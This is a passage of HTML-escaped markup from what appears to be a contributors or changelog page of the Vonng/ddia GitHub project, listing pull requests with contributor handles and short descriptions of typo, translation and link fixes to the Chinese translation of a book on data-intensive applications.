href=&#34;https://github.com/Vonng/ddia/pull/115&#34;&gt;115&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/NageNalock&#34;&gt;@NageNalock&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;第七章病句修改: 重复词语&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/114&#34;&gt;114&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Sunt-ing&#34;&gt;@Sunt-ing&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update README.md: correct the book name&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/113&#34;&gt;113&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/lpxxn&#34;&gt;@lpxxn&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修改语句&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/112&#34;&gt;112&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ibyte2011&#34;&gt;@ibyte2011&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch9.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/110&#34;&gt;110&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/lpxxn&#34;&gt;@lpxxn&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;读已写入数据&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/107&#34;&gt;107&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/abbychau&#34;&gt;@abbychau&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;單調鐘和好死还是赖活着&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/106&#34;&gt;106&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/enochii&#34;&gt;@enochii&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;typo in ch2: fix braces typo&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/105&#34;&gt;105&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/LiminCode&#34;&gt;@LiminCode&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Chronicle translation error&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/104&#34;&gt;104&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Sunt-ing&#34;&gt;@Sunt-ing&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;several advice for better translation&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/103&#34;&gt;103&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Sunt-ing&#34;&gt;@Sunt-ing&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;typo in ch4: should be 完成 rather than 完全&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/102&#34;&gt;102&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Sunt-ing&#34;&gt;@Sunt-ing&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch4: better-translation: 扼杀 → 破坏&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/101&#34;&gt;101&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Sunt-ing&#34;&gt;@Sunt-ing&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;typo in Ch4: should be &#34;改变&#34; rathr than &#34;盖面&#34;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/100&#34;&gt;100&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/LiminCode&#34;&gt;@LiminCode&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix missing translation&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/99&#34;&gt;99 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/mrdrivingduck&#34;&gt;@mrdrivingduck&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch6: fix the word rebalancing&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/98&#34;&gt;98 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/jacklightChen&#34;&gt;@jacklightChen&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix ch7.md: fix wrong references&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/97&#34;&gt;97 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/jenac&#34;&gt;@jenac&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;96&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/96&#34;&gt;96 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/PragmaTwice&#34;&gt;@PragmaTwice&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch2: fix typo about &#39;may or may not be&#39;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/95&#34;&gt;95 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/EvanMu96&#34;&gt;@EvanMu96&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix translation of &#34;the battle cry&#34; in ch5&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/94&#34;&gt;94 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/kemingy&#34;&gt;@kemingy&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch6: fix markdown and punctuations&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/93&#34;&gt;93 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/kemingy&#34;&gt;@kemingy&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch5: fix markdown and some typos&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/92&#34;&gt;92 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Gilbert1024&#34;&gt;@Gilbert1024&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Merge pull request #1 from Vonng/master&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/88&#34;&gt;88 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/kemingy&#34;&gt;@kemingy&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix typo for ch1, ch2, ch3, ch4&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/87&#34;&gt;87 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/wynn5a&#34;&gt;@wynn5a&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch3.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/86&#34;&gt;86 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/northmorn&#34;&gt;@northmorn&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch1.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/85&#34;&gt;85 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/sunbuhui&#34;&gt;@sunbuhui&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix ch2.md: fix ch2 ambiguous translation&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/84&#34;&gt;84 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ganler&#34;&gt;@ganler&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Fix translation: use up&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/83&#34;&gt;83 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/afunTW&#34;&gt;@afunTW&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Using OpenCC to convert from zh-cn to zh-tw&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/82&#34;&gt;82 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/kangni&#34;&gt;@kangni&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix gitbook url&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/78&#34;&gt;78 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hanyu2&#34;&gt;@hanyu2&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Fix unappropriated translation&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/77&#34;&gt;77 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Ozarklake&#34;&gt;@Ozarklake&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix typo&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/75&#34;&gt;75 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/2997ms&#34;&gt;@2997ms&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Fix typo&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/74&#34;&gt;74 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/2997ms&#34;&gt;@2997ms&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch9.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/70&#34;&gt;70 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/2997ms&#34;&gt;@2997ms&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch7.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/67&#34;&gt;67 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/jiajiadebug&#34;&gt;@jiajiadebug&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix issues in ch2 - ch9 and glossary&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/66&#34;&gt;66 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/blindpirate&#34;&gt;@blindpirate&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Fix typo&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/63&#34;&gt;63 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/haifeiWu&#34;&gt;@haifeiWu&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch10.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/62&#34;&gt;62 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ych&#34;&gt;@ych&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix ch1.md typesetting problem&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/61&#34;&gt;61 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/xianlaioy&#34;&gt;@xianlaioy&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;docs:钟--&amp;gt;种，去掉ou&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/60&#34;&gt;60 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Zombo1296&#34;&gt;@Zombo1296&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;否则 -&amp;gt; 或者&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/59&#34;&gt;59 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/AlexanderMisel&#34;&gt;@AlexanderMisel&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;呼叫-&amp;gt;调用，显着-&amp;gt;显著&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/58&#34;&gt;58 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ibyte2011&#34;&gt;@ibyte2011&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch8.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/55&#34;&gt;55 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/saintube&#34;&gt;@saintube&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;ch8: 修改链接错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/54&#34;&gt;54 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Panmax&#34;&gt;@Panmax&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch2.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/53&#34;&gt;53 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/ibyte2011&#34;&gt;@ibyte2011&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch9.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/52&#34;&gt;52 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/hecenjie&#34;&gt;@hecenjie&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch1.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/51&#34;&gt;51 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/latavin243&#34;&gt;@latavin243&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix 修正ch3 ch4几处翻译&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/50&#34;&gt;50 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/AlexZFX&#34;&gt;@AlexZFX&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;几个疏漏和格式错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/49&#34;&gt;49 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/haifeiWu&#34;&gt;@haifeiWu&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch1.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/48&#34;&gt;48 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/scaugrated&#34;&gt;@scaugrated&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix typo&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/47&#34;&gt;47 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/lzwill&#34;&gt;@lzwill&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Fixed typos in ch2&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/45&#34;&gt;45 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/zenuo&#34;&gt;@zenuo&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;删除一个多余的右括号&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/44&#34;&gt;44 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/akxxsb&#34;&gt;@akxxsb&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修正第七章底部链接错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/43&#34;&gt;43 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/baijinping&#34;&gt;@baijinping&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&#34;更假简单&#34;-&amp;gt;&#34;更加简单&#34;&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/42&#34;&gt;42 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/tisonkun&#34;&gt;@tisonkun&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修复 ch1 中的无序列表格式&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/38&#34;&gt;38 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/renjie-c&#34;&gt;@renjie-c&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;纠正多处的翻译小错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/37&#34;&gt;37 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/tankilo&#34;&gt;@tankilo&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix translation mistakes in ch4.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/36&#34;&gt;36 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/wwek&#34;&gt;@wwek&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;1.修复多个链接错误 2.名词优化修订 3.错误修订&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/35&#34;&gt;35 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/wwek&#34;&gt;@wwek&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix ch7.md to ch8.md link error&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/34&#34;&gt;34 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/wwek&#34;&gt;@wwek&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Merge pull request #1 from Vonng/master&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/33&#34;&gt;33 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/wwek&#34;&gt;@wwek&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;fix part-ii.md link error&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/32&#34;&gt;32 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/JCYoky&#34;&gt;@JCYoky&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch2.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/31&#34;&gt;31 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/elsonLee&#34;&gt;@elsonLee&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch7.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/26&#34;&gt;26 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/yjhmelody&#34;&gt;@yjhmelody&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修复一些明显错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/25&#34;&gt;25 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/lqbilbo&#34;&gt;@lqbilbo&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修复链接错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/24&#34;&gt;24 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/artiship&#34;&gt;@artiship&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修改词语顺序&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/23&#34;&gt;23 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/artiship&#34;&gt;@artiship&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修正错别字&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/22&#34;&gt;22 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/artiship&#34;&gt;@artiship&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;纠正翻译错误&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/21&#34;&gt;21 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/zhtisi&#34;&gt;@zhtisi&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;修正目录和本章标题不符的情况&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/20&#34;&gt;20 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/rentiansheng&#34;&gt;@rentiansheng&lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;Update ch7.md&lt;/td&gt; &#xA;   &lt;/tr&gt; &#xA;   &lt;tr&gt; &#xA;    &lt;td&gt;&lt;a href=&#34;https://github.com/Vonng/ddia/pull/19&#34;&gt;19 &lt;/a&gt;&lt;/td&gt; &#xA;    &lt;td&gt;&lt;a 